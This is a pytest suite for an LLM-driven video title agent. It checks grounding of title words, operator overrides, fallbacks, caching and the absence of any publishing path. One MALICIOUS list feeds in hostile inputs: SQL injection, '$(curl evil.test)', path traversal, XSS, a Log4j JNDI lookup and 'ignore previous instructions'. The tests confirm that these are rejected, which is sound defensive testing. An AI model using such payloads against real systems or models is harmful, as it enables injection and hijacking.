"""
Title Agent.

The LLM is injected throughout - no test needs a key or a network. The
properties most of these defend:

  * there is no publishing integration: the title reaches the app's one title
    slot, and the delivered file keeps the name it was rendered under
  * every content word is found in validated material about THIS video; a
    word only research contains, a hype word, an invented number, a link -
    each is rejected, and says why
  * story beats on clips the final cut dropped lend the title nothing
  * an operator title wins, verbatim, and nothing is generated over it
  * with no model a title is SELECTED from upstream text, never written
"""

import inspect
import json
import re
import typing
from pathlib import Path

import pytest
from pydantic import ValidationError

from agents.artifacts import (ContentStrategy, EditPlan, EvidenceItem,
                              JobSettings, KeyPoint, ResearchReport, Segment,
                              Story, StoryBeat, Title, TrendItem)
from agents.title import (FUNCTION_WORDS, HYPE, PLACEHOLDER, TitleAgent,
                          _check, _forms, _title_case, _vocab)
from agents.tools.llm_tools import LLMClient, LLMReply

CALM, LIVELY, DROPPED = "01_calm.mp4", "02_lively.mp4", "03_dropped.mp4"
DOMAIN = "LEGO Technic mechanism builds"
ROOT = Path(__file__).resolve().parents[2]


# ------------------------------------------------------------- helpers

def ti_llm(payload, record=None):
    def transport(prompt, max_tokens, images=None):
        if record is not None:
            record.append(prompt)
        text = payload if isinstance(payload, str) else json.dumps(payload)
        return LLMReply(text=text, tokens_in=220, tokens_out=40, usd=0.001)
    return LLMClient(transport=transport)


def failing_llm(error="ConnectionError: refused"):
    def transport(prompt, max_tokens, images=None):
        return LLMReply(text="", error=error)
    return LLMClient(transport=transport)


def a_plan(clips=(LIVELY, CALM)):
    return EditPlan(segments=[
        Segment(index=i, clip_id=c, start=0.5, end=3.5, duration=3.0,
                orientation="horizontal")
        for i, c in enumerate(clips, 1)],
        total_duration=5.6, target_seconds=6.0, canvas=(320, 240))


def a_strategy(topic="a working LEGO gear train", live=True):
    return ContentStrategy(
        strategy_type="reasoned" if live else "degraded",
        central_topic=topic, core_angle="how torque moves through gears",
        audience="young builders",
        key_points=[KeyPoint(point="each stage halves the speed",
                             support="vision")],
        insufficient_signal=not live, confidence=0.8 if live else 0.0,
        live=live)


def a_story(live=True, logline="a gear train built and then run"):
    return Story(
        story_type="reasoned" if live else "degraded", logline=logline,
        beats=[StoryBeat(index=1, role="hook", clip_id=LIVELY,
                         narrative="the drive gear meshes with a quad-blade "
                                   "propeller"),
               StoryBeat(index=2, role="develop", clip_id=DROPPED,
                         narrative="the motor whirs into life"),
               StoryBeat(index=3, role="ending", clip_id=CALM,
                         narrative="the whole train spins at last")],
        insufficient_signal=not live, confidence=0.8 if live else 0.0,
        live=live)


def a_research(live=True):
    return ResearchReport(
        live=live, insufficient_signal=not live, provider="tavily",
        keywords=["McLaren", "42141", "supercar"],
        trends=[TrendItem(label="licensed supercar sets",
                          observation="they dominate search")],
        evidence=[EvidenceItem(title="LEGO Technic McLaren Senna GTR 42141",
                               url="https://example.test/a", source="tavily",
                               query="lego technic", retrieved_at=1.0)])


@pytest.fixture
def ti_ctx(director_ctx):
    ctx, _cs = director_ctx
    ctx.job = ctx.job.model_copy(update={
        "settings": ctx.job.settings.model_copy(
            update={"domain": DOMAIN, "title": PLACEHOLDER})})
    return ctx


def named(ctx, title):
    ctx.job = ctx.job.model_copy(update={
        "settings": ctx.job.settings.model_copy(update={"title": title})})
    return ctx


def run(ctx, tracer_span, plan="default", strategy="default",
        story="default", research="default", revision=0):
    with tracer_span(ctx, "title") as span:
        return TitleAgent().execute(
            ctx, span,
            plan=a_plan() if plan == "default" else plan,
            strategy=a_strategy() if strategy == "default" else strategy,
            story=a_story() if story == "default" else story,
            research=a_research() if research == "default" else research,
            revision=revision)


GOOD = "How a Quad-Blade Propeller Spins a LEGO Gear Train"


# -------------------- 1. what publishing actually exists

def test_the_placeholder_is_the_schemas_own_default():
    assert PLACEHOLDER == JobSettings().title


def test_the_file_is_named_inside_the_render_not_after_it():
    """master_stage names the delivered file from settings.title, and it runs
    inside the render - so packaging cannot rename it without orphaning every
    path that points at the file."""
    from agents.tools import render_tools as RT
    from agents.tools.pipeline_bridge import extras_mod
    src = inspect.getsource(extras_mod.master_stage)
    assert 'settings.get("title")' in src
    assert 'f"{tag}_{kind}.mp4"' in src
    assert '"title": spec.title' in inspect.getsource(RT.run_master)


def test_the_app_shows_settings_title_and_nothing_else():
    jobs_src = (ROOT / "server" / "jobs.py").read_text(encoding="utf-8")
    app_src = (ROOT / "frontend" / "app.js").read_text(encoding="utf-8")
    assert 'j.settings.get("title")' in jobs_src          # the job card
    assert "job.settings?.title" in app_src              # above the player


def test_nothing_in_the_project_publishes_anywhere():
    """No path that would put a title anywhere but the app's own slot.

    The upload check names YouTube's video upload endpoint. It used to be
    any Google upload URL, which also forbade Google DRIVE's - and the
    cloud worker (server/cloud/gcp.py) stores clips and renders in Drive.
    Storing a render is not publishing a title; uploading to a channel is,
    and that is still refused here and by the publishing agent's own scan.
    """
    youtube_upload = "googleapis.com/" + "upload/youtube"
    for py in list((ROOT / "server").rglob("*.py")) + \
            list((ROOT / "pipeline").rglob("*.py")):
        src = py.read_text(encoding="utf-8", errors="ignore")
        assert youtube_upload not in src, py
        assert "youtube/v3/" + "videos" not in src, py
        assert '"-metadata"' not in src, py


# ------------------------------- 2. every word is supported

def test_a_grounded_title_is_published(ti_ctx, tracer_span):
    ti_ctx.llm = ti_llm({"titles": [GOOD], "rationale": "names the payoff",
                         "confidence": 0.8})
    art = run(ti_ctx, tracer_span)
    p = art.payload
    assert (p.text, p.source, p.title_type) == (GOOD, "model", "reasoned")
    assert p.published and p.live and not art.degraded
    where = dict(t.split("<-") for t in p.grounded_terms)
    assert where["quad-blade"] == "story" and where["lego"] == "domain"
    assert set(where.values()) <= {"domain", "strategy", "story"}


@pytest.mark.parametrize("title,reason", [
    ("A LEGO Spaceship Build", "not in anything about this video"),
    ("The Best LEGO Gear Train", "unsupported claim"),
    ("Insane LEGO Gear Train", "unsupported claim"),
    ("LEGO Gear Train #1", "unsupported claim"),
    ("LEGO McLaren Gear Train", "found only in research"),
    ("Gear Train 42141", "found only in research"),
    ("7 Gear Train Stages", "not in anything about this video"),
    ("LEGO Gear Train at www.example.com", "link or a path"),
    ("The And Of", "says nothing about the video"),
    ("Gear " * 15, "words"),
    ("Gear Train " + "x" * 100, "characters"),
])
def test_an_unsupported_title_is_rejected_and_says_why(ti_ctx, tracer_span,
                                                       title, reason):
    ti_ctx.llm = ti_llm({"titles": [title]})
    p = run(ti_ctx, tracer_span).payload
    assert p.text != title.strip()
    assert any(reason in r for r in p.rejected), p.rejected
    # nothing supportable from the model, so the strategy topic is selected
    assert p.source == "strategy" and not p.live


def test_a_beat_on_a_dropped_clip_lends_no_words(ti_ctx, tracer_span):
    ti_ctx.llm = ti_llm({"titles": ["The Motor Whirs Into Life"]})
    p = run(ti_ctx, tracer_span).payload
    assert p.text != "The Motor Whirs Into Life"
    assert any("not in anything about this video" in r for r in p.rejected)
    assert any("dropped" in x for x in p.limitations)


def test_the_same_beat_counts_when_its_clip_made_the_cut(ti_ctx,
                                                         tracer_span):
    ti_ctx.llm = ti_llm({"titles": ["The Motor Whirs Into Life"]})
    p = run(ti_ctx, tracer_span,
            plan=a_plan((LIVELY, DROPPED, CALM))).payload
    assert p.text == "The Motor Whirs Into Life" and p.source == "model"


def test_a_story_with_no_words_is_not_claimed_as_evidence(ti_ctx,
                                                          tracer_span):
    """Beats in the cut with empty narratives and an assembled logline lend
    nothing - so the artifact must not say the title rests on the story."""
    ti_ctx.llm = LLMClient()
    silent = Story(story_type="degraded", logline="assembled", live=False,
                   beats=[StoryBeat(index=1, role="hook", clip_id=LIVELY),
                          StoryBeat(index=2, role="ending", clip_id=CALM)])
    art = run(ti_ctx, tracer_span, story=silent)
    assert not art.payload.story_available
    d = next(d for d in art.decisions
             if d.what == "Evidence the title was chosen from")
    assert "Story" not in d.chose


def test_an_assembled_strategy_lends_only_its_topic(ti_ctx, tracer_span):
    """Its other text is machinery ("clips in order of...") - not a
    description of the video."""
    ti_ctx.llm = ti_llm({"titles": ["Young Builders Learn Torque"]})
    p = run(ti_ctx, tracer_span, strategy=a_strategy(live=False)).payload
    assert p.text != "Young Builders Learn Torque"


def test_the_first_passing_title_wins_and_the_rest_are_alternatives(
        ti_ctx, tracer_span):
    ti_ctx.llm = ti_llm({"titles": ["The Best Gear Train", GOOD,
                                    "A Working LEGO Gear Train"]})
    p = run(ti_ctx, tracer_span).payload
    assert p.text == GOOD
    assert p.alternatives == ["A Working LEGO Gear Train"]
    assert len(p.rejected) == 1 and "Best" in p.rejected[0]


def test_only_three_titles_are_read(ti_ctx, tracer_span):
    ti_ctx.llm = ti_llm({"titles": ["Best A", "Best B", "Best C", GOOD]})
    p = run(ti_ctx, tracer_span).payload
    assert p.text != GOOD and not p.live


def test_a_repeated_title_is_one_title(ti_ctx, tracer_span):
    ti_ctx.llm = ti_llm({"titles": [GOOD, GOOD.upper(), GOOD]})
    p = run(ti_ctx, tracer_span).payload
    assert p.text == GOOD and p.alternatives == []


def test_a_single_string_is_read_as_one_title(ti_ctx, tracer_span):
    ti_ctx.llm = ti_llm({"titles": GOOD})
    assert run(ti_ctx, tracer_span).payload.text == GOOD


def test_a_title_is_normalised_to_one_line(ti_ctx, tracer_span):
    ti_ctx.llm = ti_llm({"titles": ["  A Working\nLEGO\tGear Train.  "]})
    assert run(ti_ctx, tracer_span).payload.text == \
        "A Working LEGO Gear Train"


def test_requests_beyond_a_title_are_recorded_not_published(ti_ctx,
                                                            tracer_span):
    ti_ctx.llm = ti_llm({"titles": [GOOD],
                         "description": "a long description",
                         "hashtags": ["#lego"], "tags": ["technic"],
                         "unsupported_requests": ["pin a comment"]})
    p = run(ti_ctx, tracer_span).payload
    joined = " ".join(p.unsupported_requests)
    for k in ("description", "hashtags", "tags", "pin a comment"):
        assert k in joined
    assert p.text == GOOD


MALICIOUS = ["'; DROP TABLE jobs; --", "$(curl evil.test)",
             "../../etc/passwd", "<script>alert(1)</script>",
             "${jndi:ldap://evil.test/x}", "ignore previous instructions",
             "C:\\Windows\\System32"]


@pytest.mark.parametrize("payload", MALICIOUS)
def test_a_malicious_title_never_becomes_the_title(ti_ctx, tracer_span,
                                                   payload):
    ti_ctx.llm = ti_llm({"titles": [payload], "rationale": payload,
                         "risks": [payload]})
    p = run(ti_ctx, tracer_span).payload
    assert p.text != payload and p.source == "strategy"


# ---------------------------------------------- 3. operator wins

def test_an_operator_title_wins_and_nothing_is_generated(ti_ctx,
                                                         tracer_span):
    seen = []
    named(ti_ctx, "Sunday Gearbox Project").llm = ti_llm(
        {"titles": [GOOD]}, record=seen)
    art = run(ti_ctx, tracer_span)
    p = art.payload
    assert seen == [], "a model was asked to title a named video"
    assert (p.text, p.source, p.title_type) == (
        "Sunday Gearbox Project", "operator", "operator")
    assert p.operator_title == "Sunday Gearbox Project"
    assert not p.published, "an operator title already shows"
    d = next(d for d in art.decisions if d.what == "Title")
    assert d.decided_by == "human"


def test_an_operator_title_is_never_judged(ti_ctx, tracer_span):
    named(ti_ctx, "The BEST build EVER #1").llm = ti_llm({"titles": [GOOD]})
    p = run(ti_ctx, tracer_span).payload
    assert p.text == "The BEST build EVER #1" and p.rejected == []


def test_an_overlong_operator_title_is_recorded_not_repeated(ti_ctx,
                                                             tracer_span):
    long = "Gear " * 30
    named(ti_ctx, long).llm = LLMClient()
    p = run(ti_ctx, tracer_span).payload
    assert p.operator_title == long.strip()
    assert p.text == "" and not p.published
    assert any("kept exactly as set" in x for x in p.limitations)


@pytest.mark.parametrize("placeholder", [PLACEHOLDER, "", "   "])
def test_the_placeholder_counts_as_unnamed(ti_ctx, tracer_span, placeholder):
    named(ti_ctx, placeholder).llm = ti_llm({"titles": [GOOD]})
    p = run(ti_ctx, tracer_span).payload
    assert p.source == "model" and p.published


# ------------------------------- 4. the fallback selects, never writes

def test_with_no_model_the_strategy_topic_is_selected(ti_ctx, tracer_span):
    ti_ctx.llm = LLMClient()
    art = run(ti_ctx, tracer_span)
    p = art.payload
    assert p.text == "A Working LEGO Gear Train"
    assert p.text.lower() == "a working lego gear train", "case only"
    assert (p.source, p.title_type) == ("strategy", "degraded")
    assert p.published and not p.live
    assert art.degraded and "deterministic title" in art.fallback_used


def test_then_the_storys_logline(ti_ctx, tracer_span):
    ti_ctx.llm = LLMClient()
    p = run(ti_ctx, tracer_span, strategy=None).payload
    assert (p.text, p.source) == ("A Gear Train Built and Then Run", "story")


def test_an_assembled_logline_is_not_selected(ti_ctx, tracer_span):
    ti_ctx.llm = LLMClient()
    p = run(ti_ctx, tracer_span, strategy=None,
            story=a_story(live=False)).payload
    assert (p.text, p.source) == ("LEGO Technic Mechanism Builds", "domain")


def test_with_nothing_supportable_the_placeholder_stands(ti_ctx,
                                                         tracer_span):
    ti_ctx.job = ti_ctx.job.model_copy(update={
        "settings": ti_ctx.job.settings.model_copy(update={"domain": ""})})
    ti_ctx.llm = LLMClient()
    art = run(ti_ctx, tracer_span, strategy=None, story=None, research=None)
    p = art.payload
    assert p.text == "" and p.source is None and not p.published
    assert p.title_type == "minimal"
    assert any("placeholder stands" in x for x in p.limitations)
    d = next(d for d in art.decisions if d.what == "Where a title goes")
    assert "placeholder stands" in d.chose


def test_a_selection_that_fails_the_check_is_skipped(ti_ctx, tracer_span):
    ti_ctx.llm = LLMClient()
    p = run(ti_ctx, tracer_span,
            strategy=a_strategy(topic="the best gear train ever")).payload
    assert p.source == "story"
    assert any(r.startswith("strategy") and "unsupported claim" in r
               for r in p.rejected)


def test_title_case_changes_case_only():
    assert _title_case("a working LEGO gear train, built for iPhone") == \
        "A Working LEGO Gear Train, Built for iPhone"


def test_the_fallback_attributes_nothing_to_an_llm(ti_ctx, tracer_span):
    ti_ctx.llm = LLMClient()
    art = run(ti_ctx, tracer_span)
    assert all(d.decided_by != "llm" for d in art.decisions)
    assert any(d.decided_by == "fallback" for d in art.decisions)


@pytest.mark.parametrize("junk", ["not json", "", "[1,2]", '{"titles": '])
def test_malformed_replies_fall_back(ti_ctx, tracer_span, junk):
    ti_ctx.llm = ti_llm(junk)
    art = run(ti_ctx, tracer_span)
    assert art.fallback_used and art.payload.source == "strategy"


def test_a_failed_call_falls_back(ti_ctx, tracer_span):
    ti_ctx.llm = failing_llm()
    assert "unusable" in run(ti_ctx, tracer_span).fallback_used


def test_junk_types_are_survived(ti_ctx, tracer_span):
    ti_ctx.llm = ti_llm({"titles": [None, 7, ["x"], {"a": 1}],
                         "risks": "x", "limitations": {"a": 1},
                         "confidence": "high"})
    p = run(ti_ctx, tracer_span).payload
    assert p.source == "strategy" and p.confidence == 0.0


@pytest.mark.parametrize("bad", [5.0, -3, float("nan"), float("inf"), "x",
                                 None])
def test_confidence_is_always_in_range(ti_ctx, tracer_span, bad):
    ti_ctx.llm = ti_llm({"titles": [GOOD], "confidence": bad})
    assert 0.0 <= run(ti_ctx, tracer_span).payload.confidence <= 1.0


def test_confidence_is_capped_with_only_the_domain(ti_ctx, tracer_span):
    ti_ctx.llm = ti_llm({"titles": ["LEGO Technic Mechanism Builds"],
                         "confidence": 0.95})
    p = run(ti_ctx, tracer_span, strategy=None, story=None).payload
    assert p.source == "model" and p.confidence <= 0.4


def test_lists_are_bounded(ti_ctx, tracer_span):
    ti_ctx.llm = ti_llm({"titles": [GOOD], "risks": ["r"] * 50,
                         "limitations": ["l"] * 50,
                         "unsupported_requests": [f"u{i}" for i in range(50)]})
    p = run(ti_ctx, tracer_span).payload
    assert len(p.risks) <= 8 and len(p.limitations) <= 8
    assert len(p.unsupported_requests) <= 8


# ------------------------------------- 5. the schema keeps it honest

@pytest.mark.parametrize("kw", [
    {"text": "A Title"},                                  # no source
    {"source": "model"},                                  # no text
    {"text": "A", "source": "operator", "operator_title": "B"},
    {"text": "A", "source": "operator", "operator_title": "A",
     "published": True},
    {"published": True},
    {"text": "two\nlines", "source": "model"},
    {"text": " padded ", "source": "model"},
    {"text": "x" * 101, "source": "model"},
    {"alternatives": ["x" * 101]},
])
def test_the_schema_refuses_dishonest_titles(kw):
    with pytest.raises(ValidationError):
        Title(**kw)


@pytest.mark.parametrize("field", ["description", "tags", "hashtags",
                                   "file_name", "thumbnail_text", "upload"])
def test_the_schema_has_no_field_for_anything_but_a_title(field):
    with pytest.raises(ValidationError):
        Title(**{field: "x"})


def test_hype_and_function_words_do_not_overlap():
    assert not (HYPE & FUNCTION_WORDS)
    for n in ("one", "two", "three", "first", "top"):
        assert n not in FUNCTION_WORDS, f"{n!r} is a claim"


def test_inflections_match_and_partial_words_do_not():
    v = _vocab([("story", "the gear meshes, spinning")])
    assert _check("Gears Mesh and Spin", v, {}, 100)[0] is None
    assert _check("Ear Mesh", v, {}, 100)[0] is not None
    assert "spin" in _forms("spinning")


# --------------------------------------------------------- 6. caching

def test_identical_inputs_hit_the_cache(ti_ctx, tracer_span):
    ti_ctx.llm = ti_llm({"titles": [GOOD]})
    a = run(ti_ctx, tracer_span)
    b = run(ti_ctx, tracer_span, revision=1)
    assert a.artifact_id == b.artifact_id


@pytest.mark.parametrize("change", ["strategy", "story", "cut", "research"])
def test_the_cache_invalidates_when_an_input_changes(ti_ctx, tracer_span,
                                                     change):
    ti_ctx.llm = ti_llm({"titles": [GOOD]})
    a = run(ti_ctx, tracer_span)
    kw = {"strategy": {"strategy": a_strategy(topic="a gear train")},
          "story": {"story": a_story(logline="a different logline")},
          "cut": {"plan": a_plan((LIVELY,))},
          "research": {"research": None}}[change]
    b = run(ti_ctx, tracer_span, revision=1, **kw)
    assert a.inputs_hash != b.inputs_hash


def test_the_cache_invalidates_when_the_operator_names_it(ti_ctx,
                                                          tracer_span):
    ti_ctx.llm = ti_llm({"titles": [GOOD]})
    a = run(ti_ctx, tracer_span)
    b = run(named(ti_ctx, "My Own Title"), tracer_span, revision=1)
    assert a.inputs_hash != b.inputs_hash and b.payload.source == "operator"


# --------------------------------------------- 7. trace and decisions

def test_the_trace_records_the_call_and_the_check(ti_ctx, tracer_span):
    ti_ctx.llm = ti_llm({"titles": ["The Best One", GOOD]})
    with tracer_span(ti_ctx, "title") as span:
        art = TitleAgent().execute(ti_ctx, span, plan=a_plan(),
                                   strategy=a_strategy(), story=a_story(),
                                   research=a_research())
        assert art.trace_id == span.trace_id
    rows = [r for r in ti_ctx.tracer.for_job(ti_ctx.job.job_id)
            if r["node"] == "title"]
    tools = [t["tool"] for r in rows for t in r["tool_calls"]]
    assert "llm.complete_json" in tools and "title.ground" in tools
    assert any("title rejected" in n for n in rows[-1]["notes"])
    assert art.artifact_id in rows[-1]["output_artifacts"]
    assert rows[-1]["tokens_in"] == 220


def test_the_fallback_is_recorded_in_the_trace(ti_ctx, tracer_span):
    ti_ctx.llm = LLMClient()
    run(ti_ctx, tracer_span)
    rows = [r for r in ti_ctx.tracer.for_job(ti_ctx.job.job_id)
            if r["node"] == "title"]
    assert "deterministic title" in rows[-1]["fallback_used"]


def test_decisions_use_the_existing_closed_enum(ti_ctx, tracer_span):
    from agents.artifacts import DecidedBy
    ti_ctx.llm = ti_llm({"titles": ["The Best One", GOOD],
                         "hashtags": ["#x"]})
    art = run(ti_ctx, tracer_span)
    assert {d.decided_by for d in art.decisions} <= set(
        typing.get_args(DecidedBy))
    by = {d.what: d for d in art.decisions}
    assert by["Title"].decided_by == "llm" and by["Title"].chose == GOOD
    assert by["Every content word found upstream"].decided_by == \
        "measurement"
    assert by["Where a title goes"].decided_by == "measurement"
    assert "keeps that name" in by["Where a title goes"].why
    assert by["Titles rejected"].decided_by == "policy"
    assert "Asked for but not possible" in by
    assert "Research (context only)" in by[
        "Evidence the title was chosen from"].chose


def test_the_prompt_separates_the_video_from_the_research(ti_ctx,
                                                          tracer_span):
    seen = []
    ti_ctx.llm = ti_llm({"titles": [GOOD]}, record=seen)
    run(ti_ctx, tracer_span)
    prompt = seen[0]
    about, _, rest = prompt.partition("HOW THE SUBJECT IS TALKED ABOUT")
    assert "CONTEXT ONLY" in rest and "McLaren" in rest
    assert "McLaren" not in about
    assert "quad-blade propeller" in about
    assert "the motor whirs" not in prompt, "a dropped beat was offered"
    assert "every content word must appear" in prompt


def test_research_that_is_not_live_is_not_shown(ti_ctx, tracer_span):
    seen = []
    ti_ctx.llm = ti_llm({"titles": [GOOD]}, record=seen)
    p = run(ti_ctx, tracer_span, research=a_research(live=False)).payload
    assert "HOW THE SUBJECT IS TALKED ABOUT" not in seen[0]
    assert not p.research_available


# ------------------------------------------ 8. publishing into the app

def _title(text="A Working LEGO Gear Train", published=True):
    return Title(text=text, source="model", published=published)


def test_the_title_fills_the_placeholder_slot():
    from agents.compat import _project_settings
    s = _project_settings(JobSettings(), {}, _title())
    assert s["title"] == "A Working LEGO Gear Train"
    assert s["_title_by"] == "title agent"


def test_an_operator_title_is_never_replaced():
    from agents.compat import _project_settings
    s = _project_settings(JobSettings(title="Mine"), {}, _title())
    assert s["title"] == "Mine" and "_title_by" not in s


def test_nothing_unpublished_replaces_the_placeholder():
    from agents.compat import _project_settings
    for t in (None, _title(published=False), Title()):
        s = _project_settings(JobSettings(), {}, t)
        assert s["title"] == PLACEHOLDER and "_title_by" not in s
